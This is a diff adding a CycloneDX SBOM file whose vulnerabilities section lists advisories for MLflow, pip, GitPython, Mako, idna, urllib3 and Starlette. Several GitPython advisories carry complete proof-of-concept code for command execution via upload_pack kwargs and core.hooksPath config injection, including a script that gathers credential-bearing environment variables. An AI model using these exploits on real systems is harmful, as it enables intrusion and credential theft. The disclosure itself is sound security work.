+    { "ref": "BomRef.8121408321985905.04631676417456165" },
+    { "ref": "BomRef.14922306360036597.44073022430429487" },
+    { "ref": "BomRef.3485920486399815.9477336133464814" },
+    { "ref": "BomRef.09878564756775976.7878865504814573" },
+    { "ref": "BomRef.08942565235367073.4085943056375487" },
+    { "ref": "BomRef.4404941464232206.4853497415248088" },
+    { "ref": "BomRef.33555171198654465.19173656237491488" },
+    { "ref": "BomRef.7848788685853527.28594310403410883" },
+    { "ref": "BomRef.7412717739126425.9999444167903435" },
+    { "ref": "BomRef.28221433628256.1523608735720694" },
+    { "ref": "BomRef.895929647650957.6955412166869052" },
+    { "ref": "BomRef.6199077332529253.9128944399037019" },
+    { "ref": "BomRef.6304305676653037.16139517029674777" },
+    { "ref": "BomRef.7173253369280046.47368730011329807" },
+    { "ref": "BomRef.1050553362607839.5282893334718983" },
+    { "ref": "BomRef.1058186182746077.9440862191382844" },
+    { "ref": "BomRef.8176470624691831.7013981171630885" },
+    { "ref": "BomRef.48260033137830427.7326711294155831" },
+    { "ref": "BomRef.8255206862766266.40314735644344646" },
+    { "ref": "BomRef.8327734309233487.27596468362571247" },
+    { "ref": "BomRef.5878541841475388.30310728247363905" },
+    { "ref": "BomRef.05268548449414767.4195540537089245" },
+    { "ref": "BomRef.07065059293682419.9548507268478947" },
+    { "ref": "BomRef.4263762677099783.5344334331365403" },
+    { "ref": "BomRef.4917273060227638.8504852455897299" },
+    { "ref": "BomRef.6877575388201984.44293311648420974" },
+    { "ref": "BomRef.7322011135982046.012069101568065288" },
+    { "ref": "BomRef.29154944133480487.592995442036442" },
+    { "ref": "BomRef.21162741807756102.5571521283235905" },
+    { "ref": "BomRef.9757768562585178.199029717850702" },
+    { "ref": "BomRef.5143149595787105.6591790318279649" },
+    { "ref": "BomRef.720710808146673.05414964903196484" },
+    { "ref": "BomRef.20773621563999456.5858028328418696" },
+    { "ref": "BomRef.3537750082426476.9140221703044139" },
+    { "ref": "BomRef.9554299319784753.9947863464302448" },
+    { "ref": "BomRef.022005416253850774.3193651287275534" },
+    { "ref": "BomRef.598597294006615.8721210737192887" },
+    { "ref": "BomRef.31491594671195344.9754476579684653" },
+    { "ref": "BomRef.5869724963051772.4483174458289165" },
+    { "ref": "BomRef.2869591433719193.8180088370787095" },
+    { "ref": "BomRef.07001413142932933.5745223568187394" },
+    { "ref": "BomRef.2527870112661118.7756036202360749" },
+    { "ref": "BomRef.8581529242039442.27530834601816734" },
+    { "ref": "BomRef.058086352572724986.6787706366080802" },
+    { "ref": "BomRef.01761931343185441.14098884512472876" },
+    { "ref": "BomRef.2153407053683366.21216666423982355" },
+    { "ref": "BomRef.2606858409143358.903307879152864" },
+    { "ref": "BomRef.1909070609230531.675185424529619" },
+    { "ref": "BomRef.5132398897461105.46696528528935977" },
+    { "ref": "BomRef.4712135076534738.04900736998217081" },
+    { "ref": "BomRef.7799985975611619.4689608204723438" },
+    { "ref": "BomRef.4296858536135366.2842951147620073" },
+    { "ref": "BomRef.859767764913831.07194610149769254" },
+    { "ref": "BomRef.3780110317337849.1837464678957208" },
+    { "ref": "BomRef.706327878710936.18509679981734495" },
+    { "ref": "BomRef.1834605376973163.07048792176677388" },
+    { "ref": "BomRef.8142520883095784.5503242597710283" },
+    { "ref": "BomRef.9617674445949904.3202696341867043" },
+    { "ref": "BomRef.6072045905978448.9210639570158323" },
+    { "ref": "BomRef.6155020049857483.748125617233508" },
+    { "ref": "BomRef.30946563573541674.48477655898214367" },
+    { "ref": "BomRef.6306513410838671.4901026295276152" },
+    { "ref": "BomRef.8405864503674071.07513995322861555" },
+    { "ref": "BomRef.03158773642084711.1576905302374213" },
+    { "ref": "BomRef.33201143777741493.4606222934245785" },
+    { "ref": "BomRef.3358681175431537.2502777237180729" },
+    { "ref": "BomRef.1065417163062975.6642170305281083" },
+    { "ref": "BomRef.9650612914106284.9225736622750518" },
+    { "ref": "BomRef.6569761486629394.25834061496646343" },
+    { "ref": "BomRef.787800053406513.044713021296067246" },
+    { "ref": "BomRef.28014190257657523.638344086123739" },
+    { "ref": "BomRef.9326058442191911.12709178154758227" },
+    { "ref": "BomRef.3929373357399798.7461550618477735" },
+    { "ref": "BomRef.18396798590368346.5758031399149558" },
+    { "ref": "BomRef.2959990282899746.3231249251462036" },
+    { "ref": "BomRef.6329562151593575.7752433965008351" },
+    { "ref": "BomRef.5820232129595122.9617427789299248" },
+    { "ref": "BomRef.12313754762195073.05436435118251204" },
+    { "ref": "BomRef.23022813893137806.9472655893741919" },
+    { "ref": "BomRef.27220290062444086.9599265206298201" },
+    { "ref": "BomRef.6595201221162285.28986900803813" },
+    { "ref": "BomRef.14856856298349252.7952910318527492" },
+    { "ref": "BomRef.1555117480187337.31124857503418457" },
+    { "ref": "BomRef.19244480891789983.43176216494570985" },
+    { "ref": "BomRef.9508154906361261.049526054640007366" },
+    { "ref": "BomRef.8285641553425861.8314447929711924" },
+    { "ref": "BomRef.17287688461568362.47945544135716645" },
+    { "ref": "BomRef.7978752087593074.32979314487579636" },
+    { "ref": "BomRef.9032716119600479.976197974867525" },
+    { "ref": "BomRef.859069969737251.5026063694945134" },
+    { "ref": "BomRef.9322247450424382.34200503527004866" },
+    { "ref": "BomRef.5145132851995741.1613938197619431" },
+    { "ref": "BomRef.3432325718366507.6159441187640797" },
+    { "ref": "BomRef.6551437888350861.17056193065060887" },
+    { "ref": "BomRef.07091832226930939.7673742754670132" },
+    { "ref": "BomRef.6672167261494709.6921887589808193" },
+    { "ref": "BomRef.004271940395409013.34144534862892817" },
+    { "ref": "BomRef.3596599767068144.28536797310370465" },
+    { "ref": "BomRef.559437335258894.3959113005077758" },
+    { "ref": "BomRef.19420220600073312.8537138484530382" },
+    { "ref": "BomRef.38557386196022436.3096001331965854" },
+    { "ref": "BomRef.02568522389979011.11444445563900596" },
+    { "ref": "BomRef.35980000258800326.18404456328780527" },
+    { "ref": "BomRef.4781735997464477.9812891795904201" }
+  ],
+  "metadata": { "timestamp": "2026-05-25T20:39:01.988768+00:00" },
+  "serialNumber": "urn:uuid:1a07ebcd-fae4-4906-bfc5-b3f6758d6d61",
+  "version": 1,
+  "vulnerabilities": [
+    {
+      "affects": [{ "ref": "BomRef.1058186182746077.9440862191382844" }],
+      "bom-ref": "BomRef.7837500547421518.8685382438939987",
+      "description": "In mlflow/mlflow, the FastAPI job endpoints under `/ajax-api/3.0/jobs/*` are not protected by authentication or authorization when the `basic-auth` app is enabled. This vulnerability affects the latest version of the repository. If job execution is enabled (`MLFLOW_SERVER_ENABLE_JOB_EXECUTION=true`) and any job function is allowlisted, any network client can submit, read, search, and cancel jobs without credentials, bypassing basic-auth entirely. This can lead to unauthenticated remote code execution if allowed jobs perform privileged actions such as shell execution or filesystem changes. Even if jobs are deemed safe, this still constitutes an authentication bypass, potentially resulting in job spam, denial of service (DoS), or data exposure in job results.",
+      "id": "CVE-2026-0545",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.1058186182746077.9440862191382844" }],
+      "bom-ref": "BomRef.45866761740068673.3005980913074323",
+      "description": "A vulnerability in mlflow/mlflow versions 3.9.0 and earlier allows unauthenticated access to certain FastAPI routes when the server is started with authentication enabled (`--app-name basic-auth`) and served via uvicorn (ASGI). The FastAPI permission middleware only enforces authentication on `/gateway/` routes, leaving other routes such as the Job API (`/ajax-api/3.0/jobs/*`) and the OpenTelemetry trace ingestion API (`/v1/traces`) unprotected. This allows unauthenticated remote attackers to submit jobs, read job results, cancel running jobs, and inject arbitrary trace data into experiments. The issue arises from an architectural mismatch between Flask and FastAPI authentication mechanisms, where the `_find_fastapi_validator()` function fails to handle non-`/gateway/` paths, resulting in a complete authentication bypass. This vulnerability is fixed in version 3.10.0.",
+      "id": "CVE-2026-2652",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.31491594671195344.9754476579684653" }],
+      "bom-ref": "BomRef.8848613139757583.6358517463227858",
+      "description": "pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing \"incorrect\" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.",
+      "id": "CVE-2026-3219",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.769310632010228.26031762086286125" }],
+      "bom-ref": "BomRef.004375961443012222.8513582464146578",
+      "description": "### Summary GitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.  ### Details GitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:  - `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe. - `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.  The vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:  - `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390` - `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071` - `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125` - `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`  That validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.  Later, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:  - `upload_pack=...` becomes `--upload-pack=...` - `receive_pack=...` becomes `--receive-pack=...`  Because the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.  In practice:  - `remote.fetch(**{\"upload-pack\": helper})` is blocked with `UnsafeOptionError` - `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution  The same bypass works for:  ```python Repo.clone_from(origin, out, upload_pack=helper) repo.remote(\"origin\").fetch(upload_pack=helper) repo.remote(\"origin\").pull(upload_pack=helper) repo.remote(\"origin\").push(receive_pack=helper) ```  This does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.  Existing tests cover the hyphenated form, not the vulnerable underscore form. For example:  - `test/test_clone.py:129-136` checks `{\"upload-pack\": ...}` - `test/test_remote.py:830-833` checks `{\"upload-pack\": ...}` - `test/test_remote.py:968-975` checks `{\"receive-pack\": ...}`  Those tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.  ### PoC 1. Create and activate a virtual environment in the repository root:  ```bash python3 -m venv .venv-sec .venv-sec/bin/pip install setuptools gitdb source ./.venv-sec/bin/activate ```  2. make a new python file and put the following in there, then run it:  ```python import os import stat import subprocess import tempfile  from git import Repo from git.exc import UnsafeOptionError  # Setup: create isolated repositories so the PoC uses a normal fetch flow. base = tempfile.mkdtemp(prefix=\"gp-poc-risk-\") origin = os.path.join(base, \"origin.git\") producer = os.path.join(base, \"producer\") victim = os.path.join(base, \"victim\") proof = os.path.join(base, \"proof.txt\") wrapper = os.path.join(base, \"wrapper.sh\")  # Setup: this wrapper is just to demo things you can do, not required for the exploit to work # you could also do something like an SSH reverse shell, really anything with open(wrapper, \"w\") as f:     f.write(f\"\"\"#!/bin/sh {{   echo \"code_exec=1\"   echo \"whoami=$(id)\"   echo \"cwd=$(pwd)\"   echo \"uname=$(uname -a)\"   printf 'argv='; printf '<%s>' \"$@\"; echo   env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=<redacted>/' || true }} > '{proof}' exec git-upload-pack \"$@\" \"\"\") os.chmod(wrapper, stat.S_IRWXU)  subprocess.run([\"git\", \"init\", \"--bare\", origin], check=True, stdout=subprocess.DEVNULL) subprocess.run([\"git\", \"clone\", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  with open(os.path.join(producer, \"README\"), \"w\") as f:     f.write(\"x\")  subprocess.run([\"git\", \"-C\", producer, \"add\", \"README\"], check=True, stdout=subprocess.DEVNULL) subprocess.run(     [\"git\", \"-C\", producer, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@t\", \"commit\", \"-m\", \"init\"],     check=True,     stdout=subprocess.DEVNULL, ) subprocess.run([\"git\", \"-C\", producer, \"push\", \"origin\", \"HEAD\"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) subprocess.run([\"git\", \"clone\", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  repo = Repo(victim) remote = repo.remote(\"origin\")  # the literal Git option name is properly blocked. try:     remote.fetch(**{\"upload-pack\": wrapper})     print(\"control=unexpected_success\") except UnsafeOptionError:     print(\"control=blocked\")  # this is the actual vulnerability # you can also just do upload_pack=\"touch /tmp/proof\", the wrapper is just to show greater impact # if you do the \"touch /tmp/proof\" the script will crash, but the file will have been created remote.fetch(upload_pack=wrapper)  # Proof: the helper ran as the GitPython host process. print(\"proof_exists\", os.path.exists(proof), proof) print(open(proof).read()) ```  3. Expected result:  - The script prints `control=blocked` - The script prints `proof_exists True ...` - The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names  Example output:  ```bash GitPython % python3 test.py control=blocked proof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt code_exec=1 whoami=uid=501(wes) gid=20(staff) <redacted> cwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim uname=Darwin  <redacted> Darwin Kernel Version  <redacted>; root:xnu-11417. <redacted> argv=</var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git> USER=<redacted> SSH_AUTH_SOCK=<redacted> PATH=<redacted> HOME=<redacted> ```  This PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.  ### Impact Who is impacted: - Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior - Systems that accept a user-provided dict of \"extra Git options\" and pass it into GitPython with `**kwargs` - CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )  What the attacker needs to control:  - A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`  From a severity perspective, this could lead to - Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process - Modification of repositories, build outputs, or release artifacts - Lateral movement from CI/CD workers or automation hosts - Full compromise of the worker or service process handling repository operations  The highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.",
+      "id": "CVE-2026-42215",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.769310632010228.26031762086286125" }],
+      "bom-ref": "BomRef.3124230381018249.5042969598690173",
+      "description": "### Summary  `_clone()` validates `multi_options` as the original list, then executes `shlex.split(\" \".join(multi_options))`. A string like `\"--branch main --config core.hooksPath=/x\"` passes validation (starts with `--branch`), but after split becomes `[\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]`. Git applies the config and executes attacker hooks during clone.  ### Details  The vulnerable code is in [`git/repo/base.py` line 1383](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1383): ```python multi = shlex.split(\" \".join(multi_options)) ```  Then validation runs on the **original** list at [line 1390](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1390): ```python Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options) ```  Then execution uses the **transformed** result at [line 1392](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1392): ```python proc = git.clone(multi, \"--\", url, path, ...) ```  The [check at `git/cmd.py` line 959](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/cmd.py#L959) uses `startswith`: ```python if option.startswith(unsafe_option) or option == bare_option: ```  `\"--branch main --config ...\"` does not start with `\"--config\"`, so it passes. After `shlex.split`, `\"--config\"` becomes its own token and reaches git.  Also affects `Submodule.update()` via `clone_multi_options`.  ### PoC  ```python import sys, pathlib, subprocess sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))  from git import Repo from git.exc import UnsafeOptionError  try:     Repo.clone_from(\"/nonexistent\", \"/tmp/x\", multi_options=[\"--config\", \"core.hooksPath=/x\"]) except UnsafeOptionError:     print(\"multi_options=['--config', '...']: Block as expected\") except Exception:     pass  DIR = pathlib.Path(__file__).resolve().parent / \"workdir_b\" SRC = DIR / \"repo\" DST = DIR / \"dst\" HOOKS = DIR / \"hooks\" LOG = DIR / \"output.log\"  if not SRC.exists():     SRC.mkdir(parents=True)     r = lambda *a: subprocess.run(a, cwd=SRC, capture_output=True)     r(\"git\", \"init\", \"-b\", \"main\")     (SRC / \"f\").write_text(\"x\\n\")     r(\"git\", \"add\", \".\")     r(\"git\", \"commit\", \"-m\", \"init\")  HOOKS.mkdir(exist_ok=True) hook = HOOKS / \"post-checkout\" hook.write_text(f\"#!/bin/sh\\nwhoami > {LOG.as_posix()}\\nhostname >> {LOG.as_posix()}\\n\") hook.chmod(0o755)  LOG.unlink(missing_ok=True) payload = \"--branch main --config core.hooksPath=\" + HOOKS.as_posix()  try:     Repo.clone_from(str(SRC), str(DST), multi_options=[payload]) except UnsafeOptionError:     print(f\"multi_options=['{payload}']: BLOCKED\"); sys.exit(1) except Exception:     pass  if not LOG.exists() and DST.exists():     subprocess.run([\"git\", \"checkout\", \"--force\", \"main\"], cwd=DST, capture_output=True)  print(f\"multi_options=['{payload}']: not blocked\") print(f\"\\nHook executed: {LOG.exists()}\") if LOG.exists():     print(LOG.read_text().strip()) ```  **Output:** ``` multi_options=['--config', '...']: Block as expected multi_options=['--branch main --config core.hooksPath=.../hooks']: not blocked  Hook executed: True texugo DESKTOP-5w5HH79 ```  ### Impact  Any application passing user input to `multi_options` in `clone_from()`, `clone()`, or `Submodule.update()` is vulnerable. Attacker embeds `--config core.hooksPath=<dir>` inside a string starting with a safe option. Check does not block it. Git executes attacker code. Same class as CVE-2023-40267.",
+      "id": "CVE-2026-42284",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.769310632010228.26031762086286125" }],
+      "bom-ref": "BomRef.6069617022822004.012684877553903129",
+      "description": "`GitConfigParser.set_value()` passes values to Python's `configparser` without validating for newlines. GitPython's own `_write()` converts embedded newlines into indented continuation lines (e.g. `\\n` becomes `\\n\\t`), but Git still accepts an indented `[core]` stanza as a section header \u2014 so the injected `core.hooksPath` becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path.  The vulnerability is not merely malformed config output: GitPython's own writer converts embedded newlines into indented continuation lines, but Git still accepts an indented `[core]` stanza as a section header, so the injected `core.hooksPath` becomes effective configuration.  This was found while auditing MLRun's `project.push()` method, which passes `author_name` and `author_email` directly to `config_writer().set_value()` with no sanitization. Both parameters cross a trust boundary \u2014 they are caller-supplied API inputs that end up in `.git/config`.  PoC (standalone, no MLRun required):  ```python import git, subprocess, os  repo = git.Repo(\"/tmp/testrepo\")  with repo.config_writer() as cw:     cw.set_value(\"user\", \"name\", \"foo\\n[core]\\nhooksPath=/tmp/hooks\")  r = subprocess.run([\"git\", \"config\", \"core.hooksPath\"], cwd=\"/tmp/testrepo\", capture_output=True, text=True) assert r.returncode == 0 print(r.stdout.strip())  # /tmp/hooks  os.makedirs(\"/tmp/hooks\", exist_ok=True) open(\"/tmp/hooks/pre-commit\", \"w\").write(\"#!/bin/sh\\nid > /tmp/pwned\\n\") os.chmod(\"/tmp/hooks/pre-commit\", 0o755)  repo.index.add([\"README\"]) repo.git.commit(m=\"test\") print(open(\"/tmp/pwned\").read())  # uid=... ```  Tested on GitPython 3.1.46, git 2.39+.  Impact: This is persistent repo config poisoning. Any user who can supply `author_name` or `author_email` to an application calling `config_writer().set_value()` can redirect Git hook execution to an arbitrary path. In a multi-user or hosted environment (e.g. a shared MLRun server where multiple users push to the same repositories), one user can poison the `.git/config` of a shared repo and have their hooks run in the context of every subsequent Git operation by any user. On single-user deployments, the impact depends on whether the application later invokes Git hooks automatically.  Remediation: `set_value()` should raise on CR, LF, or NUL in values rather than silently pass them through:  ```python import re  if isinstance(value, (str, bytes)) and re.search(r\"[\\r\\n\\x00]\", str(value)):     raise ValueError(\"Git config values must not contain CR, LF, or NUL\") ```  Rejecting is safer than stripping \u2014 a stripped newline might indicate the caller is passing unsanitized input at a higher level, and silent normalization masks that.  Affected wherever `config_writer().set_value(section, key, user_input)` is called with external input.** GitPython is a dependency of DVC, MLflow, Kedro, and others \u2014 worth auditing their `set_value()` call sites for externally influenced inputs.",
+      "id": "CVE-2026-44244",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.5522601275987341.7660606554463646" }],
+      "bom-ref": "BomRef.5766019019098442.20731512443148126",
+      "description": "## Summary  On Windows, a URI using backslash traversal (e.g. `\\..\\..\\ secret.txt`) bypasses the directory traversal check in `Template.__init__` and the `posixpath`-based normalization in `TemplateLookup.get_template()`, allowing reads of files outside the configured template directory.   ## Details  The root cause is a mismatch between `posixpath` (used for URI normalization in `get_template()`) and `os.path` (used for file access via `os.path.isfile()` and validation via `os.path.normpath()` in `Template.__init__`). On Windows, `os.path` is `ntpath`, which treats `\\` as a path separator, while `posixpath` treats it as a literal character.  The vulnerability chain:  1. `get_template()` strips only leading `/` via `re.sub(r\"^\\/+\", \"\", uri)` and normalizes with `posixpath` \u2014 backslash `\\` is treated as a literal character, so `\\..\\ secret.txt` passes through with `..` undetected. 2. `Template.__init__()` validation uses `os.path.normpath()` \u2014 on Windows this resolves `\\..\\ secret.txt` to `\\secret.txt`, which does not start with `..`, so the `startswith(\"..\")` check passes. 3. `os.path.isfile()` on Windows interprets `\\` as a path separator, resolving the `..` traversal and finding files outside the template directory.  ### Affected code  - `mako/lookup.py`: `TemplateLookup.get_template()` uses `posixpath.normpath`/`posixpath.join` for path construction but `os.path.isfile()` for existence check - `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()` which on Windows resolves backslash traversal to a form that passes the `startswith(\"..\")` guard  ## Impact  If an application passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker on Windows may be able to load and disclose readable files outside the configured template directory. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.  ## Remediation  The fix should normalize backslashes to forward slashes early in the URI processing pipeline, before any path operations, to ensure consistent behavior across platforms.",
+      "id": "CVE-2026-44307",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.09878564756775976.7878865504814573" }],
+      "bom-ref": "BomRef.31089136769013925.8936079835325831",
+      "description": "This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. Payloads such as `\"\\u0660\" * N` or `\"\\u30fb\" * N + \"\\u6f22\"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process.  ### Impact A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.  ### Patches Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support).  ### Workarounds Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.",
+      "id": "CVE-2026-45409",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.31491594671195344.9754476579684653" }],
+      "bom-ref": "BomRef.43110959929884474.09375163084545057",
+      "description": "pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.",
+      "id": "CVE-2026-6357",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.769310632010228.26031762086286125" }],
+      "bom-ref": "BomRef.8143220655812616.3296782652260417",
+      "description": "Summary  The patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \\n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.  Details  File: git/config.py \u2014 GitPython 3.1.49 (latest patched version)  ```python   def set_value(self, section: str, option: str, value) -> \"GitConfigParser\":       value_str = self._value_to_string_safe(value)   # only value is validated       if not self.has_section(section):           self.add_section(section)                    # section not validated       super().set(section, option, value_str)          # option not validated       return self ```  _write() formats section headers as \"[%s]\\n\" % name. When section = \"user]\\n[core\", this writes [user]\\n[core]\\n \u2014 two valid section headers \u2014 into .git/config.  PoC  ```python   import git, os, subprocess    repo = git.Repo.init(\"/tmp/bypass_test\")    os.makedirs(\"/tmp/evil_hooks\", exist_ok=True)   with open(\"/tmp/evil_hooks/pre-commit\", \"w\") as f:       f.write(\"#!/bin/sh\\nid > /tmp/rce_proof.txt\\n\")   os.chmod(\"/tmp/evil_hooks/pre-commit\", 0o755)    # Inject newline into section parameter (not value \u2014 already patched)   with repo.config_writer() as cw:       cw.set_value(\"user]\\n[core\", \"hooksPath\", \"/tmp/evil_hooks\")    r = subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"config\", \"core.hooksPath\"],                      capture_output=True, text=True)   print(r.stdout.strip())  # \u2192 /tmp/evil_hooks    subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"commit\", \"--allow-empty\", \"-m\", \"x\"])   print(open(\"/tmp/rce_proof.txt\").read())  # \u2192 uid=1000(...) RCE confirmed ```  Impact  Same attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete \u2014 only value is validated while section and option remain injectable.",
+      "id": "GHSA-mv93-w799-cj2w",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.004271940395409013.34144534862892817" }],
+      "bom-ref": "BomRef.33791068853036355.5176986174890252",
+      "description": "urllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0.",
+      "id": "PYSEC-2026-141",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.004271940395409013.34144534862892817" }],
+      "bom-ref": "BomRef.20845622487684945.48016698180214945",
+      "description": "urllib3 is an HTTP client library for Python. From 2.6.0 to before 2.7.0, urllib3 could decompress the whole response instead of the requested portion (1) during the second HTTPResponse.read(amt=N) call when the response was decompressed using the official Brotli library or (2) when HTTPResponse.drain_conn() was called after the response had been read and decompressed partially (compression algorithm did not matter here). These issues could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This could result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data) on the client side. This vulnerability is fixed in 2.7.0.",
+      "id": "PYSEC-2026-142",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.27220290062444086.9599265206298201" }],
+      "bom-ref": "BomRef.7462420795542986.9966866035314382",
+      "description": "Starlette reconstructs the requested URL based on the HTTP Host request header and requested path, but does not perform any validation of the Host header value. This allows attackers to inject paths into the host part, prepending the actual path. However, routing in Starlette is based on the actual request path. This inconsistent interpretation of HTTP requests may lead to issues such as authentication bypass when the authentication depends on the reconstructed URL\u2019s path.",
+      "id": "PYSEC-2026-161",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.1058186182746077.9440862191382844" }],
+      "bom-ref": "BomRef.6699109452714781.5385854800985536",
+      "description": "MLflow is vulnerable to Stored Cross-Site Scripting (XSS) caused by unsafe parsing of YAML-based MLmodel artifacts in its web interface. An authenticated attacker can upload a malicious MLmodel file containing a payload that executes when another user views the artifact in the UI. This allows actions such as session hijacking or performing operations on behalf of the victim.   This issue affects MLflow version through 3.10.1",
+      "id": "PYSEC-2026-93",
+      "recommendation": "Upgrade"
+    },
+    {
+      "affects": [{ "ref": "BomRef.1058186182746077.9440862191382844" }],
+      "bom-ref": "BomRef.2236145873659935.29102855221931634",
+      "description": "MLflow is vulnerable to an authorization bypass affecting the AJAX endpoint used to download saved model artifacts. Due to missing access\u2011control validation, a user without permissions to a given experiment can directly query this endpoint and retrieve model artifacts they are not authorized to access.    This issue affects MLflow version through 3.10.1",
+      "id": "PYSEC-2026-94",
+      "recommendation": "Upgrade"
+    }
+  ],
+  "$schema": "http://cyclonedx.org/schema/bom-1.4.schema.json",
+  "bomFormat": "CycloneDX",
+  "specVersion": "1.4"
+}
